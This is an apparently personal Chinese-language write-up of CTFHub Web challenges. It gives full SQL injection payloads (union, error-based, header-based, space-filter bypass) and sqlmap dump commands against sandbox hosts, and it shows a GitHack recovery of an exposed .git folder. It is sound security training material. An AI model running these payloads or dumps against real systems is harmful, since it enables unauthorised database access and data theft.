# Web

## Web前置技能

### SQL注入

Web应用开发过程中，为了内容的快速更新，很多开发者使用数据库进行数据存储。而由于开发者在程序编写过程中，传入用户数据的过滤不严格，将可能存在的攻击载荷拼接到SQL查询语句中，再将这些查询语句传递给后端的数据库执行，从而引发实际执行的语句与预期功能不一致的情况。这种攻击被称为**SQL注入攻击**。
大多数应用在开发时将诸如密码等的数据放在数据库中，由于SQL注入攻击能够泄露系统中的敏感信息，使之成为了进入各Web系统的入口级漏洞，因此各大CTF赛事将SQL注入作为Web题目的出题点之一，SQL注入漏洞也是现实场景下最常见的漏洞类型之一。
**SQL注入是开发者对用户输入的参数过滤不严格，导致用户输入的数据能够影响预设查询功能的一种技术，通常将导致数据库的原有信息泄露、篡改，甚至被删除。**

#### 整数型SQL注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="flag"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/5.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(flag) from sqli.flag
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/6.png)

提交`ctfhub{b797799cfa5883e9255774f0}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/整数型注入/7.png)

------

#### 字符型注入

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`，可以看到是`ID`是字符型。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/1.png)

`database()`回显当前连接的数据库，用`#`注释掉后面的那一个`'`，输入以下代码可以查询到当前数据库为`sqli`：

```sql
-1' union select 1,database()#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1' union select 1,group_concat(table_name) from information_schema.tables where table_schema='sqli'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
-1' union select 1,group_concat(column_name) from information_schema.columns where table_name='flag'#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1' union select 1,group_concat(flag) from sqli.flag#
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/5.png)

提交`ctfhub{7c61389921cf96d14f3df6f9}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/字符型注入/6.png)

------

#### 报错注入

**某些网站为了方便开发者调试会开启错误调试信息，只要此时触发SQL语句的错误就能在页面上看到SQL语句执行后的报错信息，这种攻击方式被称为报错注入。**

输入1试试？输入1后只有一行回显：查询正确。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/1.png)

通过查阅相关文档可知`updatexml()`在执行时，第二个参数应该是合法的XPATH路径，否则将会在引发报错的同时将传入的参数进行输出。`database()`回显当前连接的数据库，输入以下代码可以查询到当前数据库：

```sql
1 and (updatexml(1,concat(0x7e,(database()),0x7e),1))
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
1 union select updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='sqli'),0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`flag`，我们可以去查询该表的列信息：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_name='flag')  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/4.png)

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
1 union select updatexml(1,concat(0x7e, (select group_concat(flag) from sqli.flag)  ,0x7e),1)
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/5.png)

提交`ctfhub{ce93ca39df4e9cbeee0c79c5}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/报错注入/6.png)

------

#### 布尔盲注

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

爆破出当前数据库的名字。

```sql
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" --current-db
#可以得到如下有用的结果信息(简洁版)
current database: 'sqli'
```

得到数据库名后继续爆破表信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli --tables
#可以得到如下有用的结果信息(简洁版)
+------+
| flag |
+------+
| news |
+------+
```

知道有个叫`flag`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns
#可以得到如下有用的结果信息(简洁版)
+-----------------------+
| Column | Type         |
+-----------------------+
| flag   | varchar(100) |
+-----------------------+
```

最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-68c4a9c7f10ce011.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag -C flag --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{64a098acea7e72aefc09810f} |
+----------------------------------+
```

提交`ctfhub{64a098acea7e72aefc09810f}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/布尔盲注/1.png)

------

#### 时间盲注

时间盲注攻击是利用`sleep()`或`benchmark()`等函数让`mysql`执行时间变长，经常与`if(expr1,expr2,expr3)`语句结合使用，通过页面的响应时间来判断条件是否正确。`if(expr1,expr2,expr3)`含义是：如果`expr1`为`True`则返回`expr2`，否则返回`expr3`。

这道题如果真的盲注的话会很费劲，直接启动`Kali-Linux`用`sqlmap`爆破就完事啦。

```sql
sqlmap -u "http://challenge-eccdebff49cb9b7c.sandbox.ctfhub.com:10800/?id=1" -D sqli -T flag --columns --dump
#可以得到如下有用的结果信息(简洁版)
+----------------------------------+
| flag                             |
+----------------------------------+
| ctfhub{661f441db8300ee13ac86d2b} |
+----------------------------------+
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/时间盲注/1.png)

提交`ctfhub{661f441db8300ee13ac86d2b}`即可。

------

#### MySQL结构

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`group_concat()`把产生的同一分组中的值用`,`连接形成一个字符串，`information_schema.schemata`表示`information_schema`库中的一个表名为`schemata`的表，可以在输入框输入以下代码查询所有数据库：

```sql
-1 union select 1,group_concat(schema_name) from information_schema.schemata
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/2.png)

`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```bash
-1 union select 1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/3.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，输入以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1,group_concat(table_name) from information_schema.tables where table_schema="sqli"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/4.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，上图查询到有个表叫`dmyireyrij`，我们可以去查询该表的列信息：

```sql
-1 union select 1,group_concat(column_name) from information_schema.columns where table_name="dmyireyrij"
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/5.png)

上图查询到表`dmyireyrij`中有个列叫`wqnbddiwzu`，最后输入以下代码根据`flag`字段可以查询到该字段的数据：

```sql
-1 union select 1,group_concat(wqnbddiwzu) from sqli.dmyireyrij
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/6.png)

提交`ctfhub{a251a62c47aa8b3c139cf2e4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/MySQL结构/7.png)

------

#### Cookie注入

**解法1：**`Burp Suite`

首先用`Burp Suite`抓包`id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F`进行`url`解码结果为`id输入1试试？`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/1.png)

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Cookie`为以下代码可以查询到当前数据库为`sqli`：

```sql
id=-1 union select 1, database();
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
id=-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`gsilsvtvjn`，我们可以去查询该表的列信息：

```sql
id=-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='gsilsvtvjn';
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/4.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
id=-1 union select 1, group_concat(ywcxnnlyfe) from sqli.gsilsvtvjn;
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/5.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/6.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/7.png)

爆破出当前数据库的名字：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/8.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/9.png)

知道有个叫`gsilsvtvjn`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/10.png)

最后输入以下代码根据`ywcxnnlyfe`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-40986a7ba9926439.sandbox.ctfhub.com:10800/" --cookie "id=1" --level 2 -D sqli -T gsilsvtvjn -C ywcxnnlyfe --dump 
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Cookie注入/11.png)

提交`ctfhub{9a3c5a851a615b8332cbe20b}`即可。

------

#### UA注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`User-Agent`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`ulxbfmsgqx`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='ulxbfmsgqx'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/3.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(zpmjyijptn) from sqli.ulxbfmsgqx
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/4.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/8.png)

知道有个叫`ulxbfmsgqx`的表后，可以查看该表的字段信息：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/9.png)

最后输入以下代码根据`zpmjyijptn`字段可以查询到该字段的数据：

```sql
sqlmap -u "http://challenge-c89ea44d56d68a09.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T ulxbfmsgqx -C zpmjyijptn --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/UA注入/10.png)

提交`ctfhub{85809c1cc35e607a1b7fed0a}`即可。


------

#### Refer注入

**解法1：**`Burp Suite`

`union select`可以进行联合查询，`id=-1`表示一个不存在的`id`，`database()`回显当前连接的数据库，修改`Referer`为以下代码可以查询到当前数据库为`sqli`：

```sql
-1 union select 1, database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/1.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1 union select 1, group_concat(table_name) from information_schema.tables where table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/2.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`dirxpetuan`，我们可以去查询该表的列信息：

```sql
-1 union select 1, group_concat(column_name) from information_schema.columns where table_name='dirxpetuan'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/3.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```sql
-1 union select 1, group_concat(jfsxcgbxrx) from sqli.dirxpetuan
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/4.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/5.png)

------

**解法2：**`sqlmap`

`sqlmap`中有一个参数是`--level`，表示探测等级，其默认值为`1`，`level>=2`时会检测`Cookie`注入，`level>=3`时会检测`User-Agent`注入和`Referer`注入，`level>=5`时会检测`host`注入。以下代码可以爆破出当前网站中的所有数据库：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --dbs
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/6.png)

爆破出当前数据库的名字：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 --current-db
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/7.png)

得到数据库名`sqli`后继续爆破表信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli --tables
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/8.png)

知道有个叫`dirxpetuan`的表后，可以查看该表的字段信息：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan --columns
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/9.png)

最后输入以下代码根据`jfsxcgbxrx`字段可以查询到该字段的数据：

```bash
sqlmap -u "http://challenge-72f077dfbff2b932.sandbox.ctfhub.com:10800/" --level 3 -D sqli -T dirxpetuan -C jfsxcgbxrx --dump
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/Refer注入/10.png)

提交`ctfhub{e82d7ab14d58dd03f08c3ce4}`即可。

------

#### 空格过滤

输入1试试？输入1后有俩行回显：一行`ID`一行`Data`。

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/1.png)

当`sql`中的空格被过滤时可以用`/**/`来代替。`database()`回显当前连接的数据库，用以下代码可以查询到当前数据库为`sqli`：

```sql
-1/**/union/**/select/**/1,database()
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/2.png)

`group_concat()`把产生的同一分组中的值用`,`连接并形成一个字符串，`information_schema.tables`存了`mysql`所有的表，`table_schema`是表对应的数据库名的字段，`table_name`和`table_schema`相对应，用以下代码能够查询到指定数据库的表信息：

```sql
-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/3.png)

`information_schema.columns`存了表中所有列的信息，`table_name`和`table_schema`相对应，可以看到有个表叫`nbadikctna`，我们可以去查询该表的列信息：

```bash
-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name='nbadikctna'
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/4.png)

最后输入以下代码根据`vuafekfves`字段可以查询到该字段的数据：

```sql
-1/**/union/**/select/**/1,group_concat(vuafekfves)/**/from/**/sqli.nbadikctna
```

![](https://paper.tanyaodan.com/CTFHub/Web/SQL注入/空格过滤/5.png)

提交`ctfhub{12917a7f5475c0de901aec7c}`即可。

------

### 信息泄露

#### Git泄露

##### Log

题目描述如下：

> 当前大量开发人员使用git进行版本控制，对站点自动部署。如果配置不当,可能会将.git文件夹直接部署到线上环境。这就引起了git泄露漏洞。请尝试使用BugScanTeam的GitHack完成本题

根据题目描述使用`GitHack`获取`.git`文件夹。

```bash
┌──(tyd㉿Kali)-[~/ctf]
└─$ git clone https://github.com/BugScanTeam/GitHack.git

┌──(tyd㉿Kali)-[~/ctf]
└─$ cd GitHack   

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ python2 GitHack.py http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git

  ____ _ _   _   _            _                                            
 / ___(_) |_| | | | __ _  ___| | __                                        
| |  _| | __| |_| |/ _` |/ __| |/ /                                        
| |_| | | |_|  _  | (_| | (__|   <                                         
 \____|_|\__|_| |_|\__,_|\___|_|\_\{0.0.5}                                 
 A '.git' folder disclosure exploit.                                       
                                                                           
[*] Check Depends
[+] Check depends end
[*] Set Paths
[*] Target Url: http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/                                                                      
[*] Initialize Target
[*] Try to Clone straightly
[*] Clone
正克隆到 '/home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800'...
致命错误：仓库 'http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/' 未找到
[-] Clone Error
[*] Try to Clone with Directory Listing
[*] http://challenge-86088fe5e4711df9.sandbox.ctfhub.com:10800/.git/ is not support Directory Listing                                                 
[-] [Skip][First Try] Target is not support Directory Listing
[*] Try to clone with Cache
[*] Initialize Git
[!] Initialize Git Error: 提示：使用 'master' 作为初始分支的名称。这个默认分支名称可能会更改。要在新仓库中                                           
提示：配置使用初始分支名，并消除这条警告，请执行：                         
提示：                                                                     
提示：  git config --global init.defaultBranch <名称>                      
提示：                                                                     
提示：除了 'master' 之外，通常选定的名字有 'main'、'trunk' 和 'development'。                                                                         
提示：可以通过以下命令重命名刚创建的分支：                                 
提示：                                                                     
提示：  git branch -m <name>                                               
                                                                           
[*] Cache files
[*] packed-refs
[*] config
[*] HEAD
[*] COMMIT_EDITMSG
[*] ORIG_HEAD
[*] FETCH_HEAD
[*] refs/heads/master
[*] refs/remote/master
[*] index
[*] logs/HEAD
[*] logs/refs/heads/master
[*] Fetch Commit Objects
[*] objects/05/4002c4fd9c95edfaa91ba505b6d1dd8f680b32
[*] objects/01/2ae1fc6b838a345b689ae6bb4ec0edfd517a64
[*] objects/2c/1e32dfd33267f265fda913d29e29572c2ba0be
[*] objects/58/1bd5a9f51c3a1ba88014543f3c390c8542fde7
[*] objects/90/71e0a24f654c88aa97a2273ca595e301b7ada5
[*] objects/2c/59e3024e3bc350976778204928a21d9ff42d01
[*] objects/54/adac7f5e33aa6122e1c7b04e05cf2c03363c55
[*] objects/8b/1cb6b6cccaccbac8560385b1300c5494369a16
[*] Fetch Commit Objects End
[*] logs/refs/remote/master
[*] logs/refs/stash
[*] refs/stash
[*] Valid Repository
[+] Valid Repository Success

[+] Clone Success. Dist File : /home/tyd/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800

┌──(tyd㉿Kali)-[~/ctf/GitHack]
└─$ cd dist//challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800                                                                                      
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git log                                             
commit 054002c4fd9c95edfaa91ba505b6d1dd8f680b32 (HEAD -> master)
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:55 2023 +0000

    remove flag

commit 2c1e32dfd33267f265fda913d29e29572c2ba0be
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000

    add flag

commit 54adac7f5e33aa6122e1c7b04e05cf2c03363c55
Author: CTFHub <sandbox@ctfhub.com>
Date:   Fri Jul 21 12:09:54 2023 +0000


┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git diff 2c1e32dfd33267f265fda913d29e29572c2ba0be
diff --git a/226282577915965.txt b/226282577915965.txt
deleted file mode 100644
index 8b1cb6b..0000000
--- a/226282577915965.txt
+++ /dev/null
@@ -1 +0,0 @@
-ctfhub{21b194cfff1432ef1c38d79c}

# git diff查看版本间更改，得到flag：ctfhub{21b194cfff1432ef1c38d79c}
# 此外还可以 git reset --hard

┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ git reset --hard 2c1e32dfd33267f265fda913d29e29572c2ba0be
HEAD 现在位于 2c1e32d add flag
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ ls
226282577915965.txt  50x.html  index.html
                                                                           
┌──(tyd㉿Kali)-[~/ctf/GitHack/dist/challenge-86088fe5e4711df9.sandbox.ctfhub.com_10800]
└─$ cat 226282577915965.txt                                     
ctfhub{21b194cfff1432ef1c38d79c}
```

提交`ctfhub{21b194cfff1432ef1c38d79c}`即可。

------

